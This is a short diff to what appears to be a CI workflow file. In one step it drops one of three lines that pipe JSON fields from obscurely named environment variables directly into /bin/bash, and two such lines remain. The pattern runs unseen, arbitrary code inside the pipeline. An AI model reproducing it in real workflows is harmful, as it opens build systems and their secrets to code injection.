@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$nfn3" | jq -r .xjgt8722 | /bin/bash
           echo $ih6936 | jq -r .ftw700 | /bin/bash
-          printf '%s' "$vfd86" | jq -r .ni9 | /bin/bash
 
       - name: Persist output
         if: always()
